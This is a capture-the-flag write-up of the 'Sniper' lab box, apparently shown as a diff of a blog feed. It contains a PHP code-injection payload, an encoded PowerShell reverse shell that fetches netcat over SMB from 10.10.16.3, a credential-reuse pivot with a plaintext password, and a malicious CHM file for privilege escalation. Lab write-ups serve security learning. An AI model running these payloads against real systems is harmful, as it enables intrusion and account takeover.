-  <li><strong>Not accepting</strong> <code class="language-plaintext highlighter-rouge">c:</code> in the request</li>
-  <li><strong>Doesn’t like the path</strong> when it’s missing a <code class="language-plaintext highlighter-rouge">/</code> or <code class="language-plaintext highlighter-rouge">\</code> in the beggining</li>
-  <li><strong>But is alright with specifying the path without the</strong> <code class="language-plaintext highlighter-rouge">c:</code> <strong>part</strong></li>
-</ul>
-
-<p>We now know that <strong>we can include the input of the username field into the HTML.</strong></p>
-
-<p>So we move on to the next step.</p>
-
-<h2 id="finding-the-allowed-special-characters">Finding the allowed special characters</h2>
-<p>We’re going to <strong>brute force all the special characters</strong> at the <strong>registration form</strong> using <strong>Burp</strong> and find out what’s allowed and what’s not.</p>
-
-<p>Here are the <strong>requests and responses for both the registration and login</strong>.</p>
-
-<p><em>Upon submitting the registration request,</em> the response we got was a <strong>302 redirection to the initial login page</strong></p>
-
-<p><img src="/assets/Sniper/registratio-initial-request.jpg" alt="registratio-initial-request" /></p>
-
-<p><em>When trying to login,</em> we get a <strong>302 redirect followed by a 200 OK</strong></p>
-
-<p><img src="/assets/Sniper/login-success-redirect.jpg" alt="login-success-redirect" /></p>
-
-<p><img src="/assets/Sniper/login-success-response.jpg" alt="login-success-response" /></p>
-
-<p>I <strong>searched for a way to get all the special characters</strong> and found one using <code class="language-plaintext highlighter-rouge">python</code></p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">string</span>
-<span class="k">print</span> <span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">)</span>
-</code></pre></div></div>
-<p><img src="/assets/Sniper/special-chars-using-python.jpg" alt="special-chars-using-python" /></p>
-
-<p>we’re going to <strong>use those as payloads</strong> with <strong>Burp Intruder’s Sniper attack type</strong>. <em>Sniper :D</em></p>
-
-<p><img src="/assets/Sniper/registration-brute-1.jpg" alt="registration-brute-1" /></p>
-
-<p><img src="/assets/Sniper/registration-brute-2.jpg" alt="registration-brute-2" /></p>
-
-<p><em>after launching the attack,</em> we notice that <strong>we get a 302 response with all requests (32 total) and with a fixed length of 292</strong></p>
-
-<p><img src="/assets/Sniper/registration-brute-3.jpg" alt="registration-brute-3" /></p>
-
-<p><strong>are ALL special characters allowed?</strong></p>
-
-<p><em>if true,</em> we would <strong>want to verify that.</strong></p>
-
-<p><em>otherwise,</em> we would get ourselves into a <strong>blind, mindless and merciless loop of trial-and-error.</strong></p>
-
-<p>We’re going to do <strong>the same brute force attack with the login form</strong> to <strong>see which ones would log in and -by extension- give us cookies that we can include</strong></p>
-
-<p><img src="/assets/Sniper/login-brute-1.jpg" alt="login-brute-1" /></p>
-
-<p><img src="/assets/Sniper/login-brute-2.jpg" alt="login-brute-2" /></p>
-
-<p>the results show that <strong>there were -in fact- blacklisted characters</strong></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>" $ &amp; ( - . ; [ \ _
-</code></pre></div></div>
-<p>and the allowed ones:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>! # % ' ) * + , / : &lt; = &gt; ? @ ] ^ ` { | } ~
-</code></pre></div></div>
-
-<p>this is good! Because:</p>
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">&lt;</code>, <code class="language-plaintext highlighter-rouge">&gt;</code> and <code class="language-plaintext highlighter-rouge">?</code> are needed for the <strong>tags</strong> needed to <strong>inject PHP</strong></li>
-  <li>and the <strong>backtick</strong> can be used for <strong>code execution</strong> (<em>just like in</em> <strong>Bash</strong>)</li>
-</ul>
-
-<p>we can craft a <strong>payload</strong> like this:</p>
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="sb">`whoami`</span> <span class="cp">?&gt;</span>
-</code></pre></div></div>
-
-<p><em>after logging in,</em> we get the cookie value from the browser and are able to get <strong>code execution.</strong></p>
-
-<p><img src="/assets/Sniper/rce-achieved.jpg" alt="rce-achieved" /></p>
-
-<h2 id="stomping-the-blacklisting-with-powershell">Stomping the blacklisting with PowerShell</h2>
-<p><em>with</em> <strong>RCE</strong> <em>achieved,</em> we have to find a way to <strong>execute a reverse shell with the allowed characters we have.</strong></p>
-
-<p><strong>We have a couple of challenges here:</strong></p>
-<ul>
-  <li>the <strong>dollar sign</strong> (<code class="language-plaintext highlighter-rouge">$</code>), the <strong>semi-colon</strong> (<code class="language-plaintext highlighter-rouge">;</code>), the <strong>brackets</strong> <code class="language-plaintext highlighter-rouge">(</code> and <code class="language-plaintext highlighter-rouge">[</code> along with the <strong>underscore</strong> (<code class="language-plaintext highlighter-rouge">_</code>) are blocked, which enable the standard <strong>PHP backdoor</strong> <code class="language-plaintext highlighter-rouge">&lt;?php exec($_REQUEST["cmd"]);?&gt;</code></li>
-  <li><em>also,</em> the <strong>dot</strong> (<code class="language-plaintext highlighter-rouge">.</code>) is blocked, so we can’t use our <strong>ip address</strong> in the payload to download something.</li>
-  <li><em>And, with the</em> <strong>backslash</strong> <code class="language-plaintext highlighter-rouge">\</code> <em>blocked as well,</em> it means <strong>writing to paths other that the current directory isn’t allowed</strong></li>
-</ul>
-
-<p><em>when thinking about using</em> <strong>PowerShell</strong> <em>in execution,</em> I remembered that we could use the encoded switch <code class="language-plaintext highlighter-rouge">-E</code> and pass <strong>base64-encoded commands.</strong></p>
-
-<p>This <strong>feature</strong> was <em>initially built</em> to <strong>make handling tricky sequences of special characters easier.</strong></p>
-
-<p><em>Even though the dash</em> (<code class="language-plaintext highlighter-rouge">-</code>) <em>is blocked</em>, <strong>this trick is still doable</strong> with the <em>whitelisted</em> <strong>forward slash</strong> (<code class="language-plaintext highlighter-rouge">/</code>).</p>
-
-<p>This is similar to <strong>regular windows commands</strong> (ex: <code class="language-plaintext highlighter-rouge">ipconfig /all</code>)</p>
-
-<p>we test out a simple <strong>PowerShell</strong> command <code class="language-plaintext highlighter-rouge">get-date</code></p>
-
-<p><img src="/assets/Sniper/powershell-encoding.jpg" alt="powershell-encoding" /></p>
-
-<p>notice the encoding type is set to <strong>UTF-16LE</strong>. That’s what <strong>PowerShell</strong> expects when using that parameter.</p>
-
-<p><img src="/assets/Sniper/powershell-encoded-execution.jpg" alt="powershell-encoded-execution" /></p>
-
-<p><em>After verifying that this method works, and after failing with many reverse shell options,</em> I set up an <strong>Impacket SMB Server</strong> and hosted <code class="language-plaintext highlighter-rouge">netcat</code> (the 64-bit version) and <strong>managed to get code execution with this payload</strong>:</p>
-
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="sb">`powershell /e XABcADEAMAAuADEAMAAuADEANgAuADMAXABzAFwAbgBjADYANAAuAGUAeABlACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANgAuADMAIAA5ADAAMAAwAA==`</span> <span class="cp">?&gt;</span>
-</code></pre></div></div>
-<p>which is:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\10.10.16.3\s\nc64.exe -e powershell 10.10.16.3 9000
-</code></pre></div></div>
-
-<p><em>thankfully, after all this hard work,</em> we’re rewarded with a <strong>reverse shell :D</strong></p>
-
-<p><img src="/assets/Sniper/shell-as-iusr.jpg" alt="shell-as-iusr" /></p>
-
-<h2 id="finding-creds-in-the-database-settings-file-like-always">Finding creds in the database settings file (<em>like always</em>)</h2>
-<p><em>The first thing I did after getting the shell,</em> was <strong>check the files in the web root.</strong></p>
-
-<p>I found a file called <code class="language-plaintext highlighter-rouge">db.php</code> in the <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\user</code> directory.</p>
-
-<p><strong>The contents were:</strong></p>
-
-<p><img src="/assets/Sniper/creds-in-db-php.jpg" alt="creds-in-db-php" /></p>
-
-<p>I check the users on the system with <code class="language-plaintext highlighter-rouge">net user</code> to <strong>get a list of usernames to reuse the password with</strong></p>
-
-<p><img src="/assets/Sniper/local-users.jpg" alt="local-users" /></p>
-
-<p>The password works for <code class="language-plaintext highlighter-rouge">chris</code></p>
-
-<p><img src="/assets/Sniper/got-chris.jpg" alt="got-chris" /></p>
-
-<h2 id="getting-a-shell-as-chris">Getting a shell as Chris</h2>
-<p>The situation is that we want to pivot to the <code class="language-plaintext highlighter-rouge">chris</code> user <strong>without losing the shell</strong> <em>if possible</em></p>
-
-<p>We can do so from our <strong>PowerShell</strong> prompt using the below method:</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"Sniper\chris"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"36mEAhz/B8xQ~2VM"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">))</span><span class="w">
-</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Scriptblock</span><span class="w"> </span><span class="p">{</span><span class="n">\\10.10.16.3\s\nc64.exe</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nx">10.10.16.3</span><span class="w"> </span><span class="nx">9001</span><span class="p">}</span><span class="w"> </span><span class="nt">-AsJob</span><span class="w">
-</span></code></pre></div></div>
-
-<p>we’re basically <strong>creating a</strong> <code class="language-plaintext highlighter-rouge">credential</code> <strong>object</strong> for the <code class="language-plaintext highlighter-rouge">chris</code> user and <strong>invoking a local script as him</strong> but <em>as a job</em> to <strong>fork into a new process</strong> and <strong>leave our shell in tact.</strong></p>
-
-<p><img src="/assets/Sniper/shell-as-chris.jpg" alt="shell-as-chris" /></p>
-
-<p><strong>Neat :)</strong></p>
-
-<h2 id="privilege-escalation-scanning-the-file-system">Privilege Escalation: Scanning the file system</h2>
-<p><em>When checking the folders in chris’s user profile,</em> we find a file called <code class="language-plaintext highlighter-rouge">intructions.chm</code> in his <code class="language-plaintext highlighter-rouge">Downloads</code> folder.</p>
-
-<p>We <strong>copy it over to our Kali using the SMB share.</strong></p>
-
-<p><img src="/assets/Sniper/found-chm-file.jpg" alt="found-chm-file" /></p>
-
-<p><em>When we open the file,</em> we get the <strong>content</strong> below:</p>
-
-<p><img src="/assets/Sniper/chm-file-contents.jpg" alt="chm-file-contents" /></p>
-
-<p><strong>This is information on the internal operations here:</strong></p>
-<ul>
-  <li>There’s <strong>a project of an android app</strong> <em>in development</em></li>
-  <li><strong>That document</strong> looks like <strong>a draft for its documentation</strong></li>
-</ul>
-
-<p><em>other than that, according to the text,</em> it seems like the chris guy is really stressed out and thinking about quitting his job because the CEO is overloading him with work.</p>
-
-<p>We don’t know if this information would be handy or not. But we take note of it nonetheless and move on.</p>
-
-<p><em>In the system root</em> (<code class="language-plaintext highlighter-rouge">c:\</code>), we find a folder that <strong>sticks out:</strong> <code class="language-plaintext highlighter-rouge">Docs</code></p>
-
-<p><em>Looking at its contents,</em> we see a <code class="language-plaintext highlighter-rouge">note.txt</code> file:</p>
-
-<p><img src="/assets/Sniper/docs-and-note-txt.jpg" alt="docs-and-note-txt" /></p>
-
-<p><em>Apart from the CEO bullying the chris guy,</em><br />
-<em>and even leaving him a copy of</em> <code class="language-plaintext highlighter-rouge">"php for dummies-trial.pdf"</code> <em>as a further insult XD</em></p>
-
-<ul>
-  <li>he is <strong>asking about the documentation for the new app</strong> (<em>very possibly referring to the android project in development</em>).</li>
-  <li>and <strong>wants him to drop it into this folder</strong> <code class="language-plaintext highlighter-rouge">"c:\Docs"</code> once done.</li>
-</ul>
-
-<p>Sounds like we need to <strong>create a malicious</strong> <code class="language-plaintext highlighter-rouge">.chm</code> file and put it there.</p>
-
-<p><em>if the CEO happens to be the local <code class="language-plaintext highlighter-rouge">administrator</code> and opens the file,</em> we should root the box.</p>
-
-<h2 id="chm-files-for-the-win">CHM Files for the win</h2>
-<p><em>Searching</em> <strong>Google</strong>, we come accross this <a href="https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e">blog</a> explaining exactly <strong>how to execute a payload using a <code class="language-plaintext highlighter-rouge">.chm</code> file</strong> using a script from the <strong>Nishang script suite.</strong></p>
-
-<p><em>Following the article,</em> we download the <strong>“HTML Help Workshop and Documentation program”</strong> and <strong>get the script</strong> from the <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Github Repository</a>.</p>
-
-<p>We <strong>import</strong> the <code class="language-plaintext highlighter-rouge">Out-CHM.ps1</code> file and use it to get a <code class="language-plaintext highlighter-rouge">doc.chm</code> file</p>
-
-<p><img src="/assets/Sniper/generating-chm.jpg" alt="generating-chm" /></p>
-
-<p><em>After copying it to the <code class="language-plaintext highlighter-rouge">Docs</code> folder and waiting a few moments,</em> The <code class="language-plaintext highlighter-rouge">.chm</code> file <strong>gets executed</strong>. and <strong>the Administrator’s password is changed</strong></p>
-
-<p>We confirm with <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>
-
-<p><img src="/assets/Sniper/got-admin.jpg" alt="got-admin" /></p>
-
-<p><strong>Pretty fun box :]</strong></p>
-
-<h2 id="unintended-path-rfi-through-smb">Unintended Path: RFI through SMB</h2>
-<p><em>When checking the ability of adding network paths as the file inclusion payload,</em> we got <strong>PHP code execution:</strong></p>
-
-<p><img src="/assets/Sniper/rfi-php-info.jpg" alt="rfi-php-info" /></p>
-
-<p>This path is <strong>much easier</strong> but also <strong>teaches way less than the LFI one.</strong></p>
-
-<h2 id="out-of-curiousity-a-look-at-the-php-within-the-blog-directorys-indexphp">Out of Curiousity: A look at the PHP within the blog directory’s <code class="language-plaintext highlighter-rouge">index.php</code></h2>
-<p><img src="/assets/Sniper/lfi-hardening.jpg" alt="lfi-hardening" /></p>
-
-<p>in <code class="language-plaintext highlighter-rouge">index.php</code>, we the code <strong>looks for <code class="language-plaintext highlighter-rouge">..</code> and <code class="language-plaintext highlighter-rouge">C:</code> within the included file path</strong> and <strong>throws an error if it detects any.</strong></p>
-
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">include</span> <span class="s1">'header.html'</span><span class="p">;</span> <span class="cp">?&gt;</span>
-<span class="cp">&lt;?php</span>
-<span class="nb">stream_wrapper_unregister</span><span class="p">(</span><span class="s2">"php"</span><span class="p">);</span>
-<span class="nb">stream_wrapper_unregister</span><span class="p">(</span><span class="s2">"data"</span><span class="p">);</span> 
-<span class="nv">$lang</span> <span class="o">=</span> <span class="s2">"blog-en.php"</span><span class="p">;</span>
-<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">ISSET</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'lang'</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="k">include</span> <span class="nv">$lang</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="k">else</span> <span class="p">{</span>
-    <span class="nv">$lang</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'lang'</span><span class="p">];</span>
-
-    <span class="k">if</span><span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$lang</span><span class="p">,</span> <span class="s2">".."</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span> <span class="o">&amp;&amp;</span> <span class="nb">stripos</span><span class="p">(</span><span class="nv">$lang</span><span class="p">,</span> <span class="s2">"C:"</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Hardened 8)</span>
-        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="k">include</span> <span class="nv">$lang</span><span class="p">))</span> <span class="p">{</span>
-            <span class="k">include</span> <span class="s2">"error.html"</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="k">else</span> <span class="p">{</span>
-        <span class="k">include</span> <span class="s2">"error.html"</span><span class="p">;</span>
-        <span class="k">die</span><span class="p">();</span>
-    <span class="p">}</span> 
-<span class="p">}</span>
-
-<span class="cp">?&gt;</span>
-</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p><strong>A piece of cake :D</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
